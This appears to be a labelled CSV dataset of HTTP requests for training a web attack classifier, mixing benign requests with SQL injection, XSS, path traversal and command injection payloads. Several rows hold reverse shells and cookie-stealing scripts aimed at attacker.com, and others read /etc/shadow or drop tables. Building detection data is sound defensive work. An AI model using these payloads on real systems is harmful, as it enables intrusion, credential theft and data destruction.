request_text,label
"GET /tools?host=192.168.1.1&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])' HTTP/1.1
Host: example.com",cmdi
"GET /api/execute?host=test; id HTTP/1.1
Host: example.com",cmdi
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test|| whoami",cmdi
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<object data=javascript:alert(1)>&user=test",xss
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost| set",cmdi
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1&& nmap -sV localhost",cmdi
"GET /feedback?q=<img src=x onerror=confirm(1)> HTTP/1.1
Host: example.com",xss
"GET /api/auth?q=1' ORDER BY 10-- HTTP/1.1
Host: example.com",sqli
"GET /api/execute?host=8.8.8.8& whoami HTTP/1.1
Host: example.com",cmdi
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check| find / -perm -4000 2>/dev/null",cmdi
"GET /images?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"PUT /api/users/diana HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""diana@email.com"",""name"":""Diana""}",benign
"GET /search?q=<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script> HTTP/1.1
Host: example.com",xss
"PUT /api/users/charlie HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""charlie@email.com"",""name"":""Charlie""}",benign
"GET /images?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"GET /profile?q=<iframe onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /api/file?file=../../../var/log/apache2/access.log HTTP/1.1
Host: example.com",traversal
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<body onload=alert(1)>&user=test",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='; alert(1); var x='&user=test",xss
"GET /search?q=coffee maker&page=10&sort=asc HTTP/1.1
Host: example.com",benign
"GET /search?q=admin'-- HTTP/1.1
Host: example.com",sqli
"GET /login?q=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- HTTP/1.1
Host: example.com",sqli
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert(document.cookie)</script>&user=test",xss
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=javascript:alert(1)&user=test",xss
"GET /download?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost&& whoami",cmdi
"GET /download?file=..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"GET /api/file?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>&user=test",xss
"GET /download?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"GET /static?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /search?q=camera lens&page=6&sort=asc HTTP/1.1
Host: example.com",benign
"GET /tools?host=localhost| cat /etc/shadow HTTP/1.1
Host: example.com",cmdi
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>&user=test",xss
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg onload=prompt(document.domain)>&user=test",xss
"GET /files/invoice_2024.pdf HTTP/1.1
Host: example.com",benign
"GET /admin/login?q=1 UNION SELECT @@datadir-- HTTP/1.1
Host: example.com",sqli
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' HAVING 1=1--&password=test",sqli
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR IF(1=1,SLEEP(3),0)--&password=test",sqli
"GET /api/execute?host=192.168.1.1| dir C:\ HTTP/1.1
Host: example.com",cmdi
"GET /checkout?q=' OR EXISTS(SELECT * FROM users WHERE username='admin')-- HTTP/1.1
Host: example.com",sqli
"GET /api/data?limit=66&offset=414&format=json HTTP/1.1
Host: example.com",benign
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='; alert(1); var x='&user=test",xss
"GET /checkout?q=OR 1=1# HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=%27 OR %271%27=%271&password=test",sqli
"DELETE /api/cart/item/533 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /api/users/profile HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /exec?host=192.168.1.1&& ls /etc HTTP/1.1
Host: example.com",cmdi
"GET /api/auth?q=1; WAITFOR DELAY '0:0:5'-- HTTP/1.1
Host: example.com",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg onload=alert(1)>&user=test",xss
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT null,null,null--&password=test",sqli
"GET /checkout?q=' AND 1=BENCHMARK(5000000,MD5('a'))-- HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DROP TABLE users--&password=test",sqli
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8|| whoami",cmdi
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>document.location='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>&user=test",xss
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR IF(1=1,SLEEP(3),0)--&password=test",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=ivan&password=SecureP@ss1",benign
"GET /download?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /admin/login?q=' UNION SELECT username,password FROM users-- HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1;SELECT pg_sleep(5)--&password=test",sqli
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test& whoami",cmdi
"PUT /api/users/frank HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""frank@email.com"",""name"":""Frank""}",benign
"GET /api/file?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /download?file=../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /files?file=file:///etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=%27 OR %271%27=%271&password=test",sqli
"GET /search?q=coffee maker&page=6&sort=asc HTTP/1.1
Host: example.com",benign
"GET /static?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert(document.cookie)</script>&user=test",xss
"GET /search?q=<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script> HTTP/1.1
Host: example.com",xss
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(1)%3C/script%3E&user=test",xss
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<video src=x onerror=alert(1)>&user=test",xss
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=test",sqli
"GET /user?q=admin' OR '1'='1' LIMIT 1-- HTTP/1.1
Host: example.com",sqli
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| whoami",cmdi
"GET /files?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /product/sku_789 HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /images?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check&& ls /etc",cmdi
"GET /run?host=localhost$(curl attacker.com/c2?h=$(hostname)) HTTP/1.1
Host: example.com",cmdi
"GET /api/file?file=expect://id HTTP/1.1
Host: example.com",traversal
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test`id`",cmdi
"GET /profile?q=-moz-binding: url(http://attacker.com/xss.xml#xss) HTTP/1.1
Host: example.com",xss
"GET /download?file=....//etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=alice&password=SecureP@ss1",benign
"GET /search?q=smartphone&page=4&sort=asc HTTP/1.1
Host: example.com",benign
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=prompt(1)>&user=test",xss
"GET /files?file=....//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /product/brand_apple HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /api/users/profile HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"GET /view?file=..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR 1=1#&password=test",sqli
"GET /api/file?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"GET /feedback?q='; alert(1); var x=' HTTP/1.1
Host: example.com",xss
"GET /api/execute?host=8.8.8.8&& id HTTP/1.1
Host: example.com",cmdi
"GET /images?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=') OR ('1'='1&password=test",sqli
"GET /exec?host=check`id` HTTP/1.1
Host: example.com",cmdi
"GET /feedback?q=<input onfocus=alert(1) autofocus> HTTP/1.1
Host: example.com",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<a href=javascript:alert(1)>click me</a>&user=test",xss
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=OR 1=1#&password=test",sqli
"GET /admin/login?q=%27 OR %271%27=%271 HTTP/1.1
Host: example.com",sqli
"GET /search?q=python book&page=8&sort=asc HTTP/1.1
Host: example.com",benign
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test&& nmap -sV localhost",cmdi
"GET /files/report.pdf HTTP/1.1
Host: example.com",benign
"GET /api/data?limit=96&offset=407&format=json HTTP/1.1
Host: example.com",benign
"GET /wishlist HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost; printenv",cmdi
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",cmdi
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=grace&password=SecureP@ss1",benign
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check&& uname -a",cmdi
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<iframe onload=alert(1)>&user=test",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR 1=1#&password=test",sqli
"GET /run?host=check| uname -a HTTP/1.1
Host: example.com",cmdi
"GET /search?q=headphones&page=8&sort=asc HTTP/1.1
Host: example.com",benign
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost| nc attacker.com 4444 -e /bin/bash",cmdi
"GET /product?q=';SELECT pg_sleep(5)-- HTTP/1.1
Host: example.com",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>&user=test",xss
"GET /product/newest_arrivals HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /ping?host=8.8.8.8| find / -perm -4000 2>/dev/null HTTP/1.1
Host: example.com",cmdi
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND 1=2--&password=test",sqli
"GET /view?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /login?q=1' AND extractvalue(1,concat(0x7e,version()))-- HTTP/1.1
Host: example.com",sqli
"PUT /api/users/heidi HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""heidi@email.com"",""name"":""Heidi""}",benign
"GET /ping?host=8.8.8.8| whoami HTTP/1.1
Host: example.com",cmdi
"GET /images?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check&& ls /etc",cmdi
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=alert(1)>&user=test",xss
"PUT /api/users/john_doe HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""john_doe@email.com"",""name"":""John Doe""}",benign
"GET /search?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1
Host: example.com",xss
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<video src=x onerror=alert(1)>&user=test",xss
"GET /search?q=wireless mouse&page=8&sort=asc HTTP/1.1
Host: example.com",benign
"GET /images?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>&user=test",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=judy&password=SecureP@ss1",benign
"GET /login?q=' UNION SELECT null,null-- HTTP/1.1
Host: example.com",sqli
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<link rel=stylesheet href=javascript:alert(1)>&user=test",xss
"GET /files?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /run?host=test& whoami HTTP/1.1
Host: example.com",cmdi
"GET /api/data?limit=51&offset=430&format=json HTTP/1.1
Host: example.com",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=javascript:alert(1)&user=test",xss
"GET /tools?host=test$(curl attacker.com/c2?h=$(hostname)) HTTP/1.1
Host: example.com",cmdi
"GET /profile?q=<script>new Image().src='http://attacker.com/?c='+document.cookie</script> HTTP/1.1
Host: example.com",xss
"GET /api/file?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' AND SLEEP(5)--&password=test",sqli
"GET /api/file?file=../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/file?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /debug?host=localhost| uname -a HTTP/1.1
Host: example.com",cmdi
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' GROUP BY 1--&password=test",sqli
"GET /files?file=../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /contact HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /comment?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: example.com",xss
"GET /feedback?q=<img src=x onerror=prompt(1)> HTTP/1.1
Host: example.com",xss
"GET /comment?q=-moz-binding: url(http://attacker.com/xss.xml#xss) HTTP/1.1
Host: example.com",xss
"GET /api/auth?q=1 OR 1=1 HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=diana&password=SecureP@ss1",benign
"GET /download?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' HAVING 1=1--&password=test",sqli
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost; ls -la",cmdi
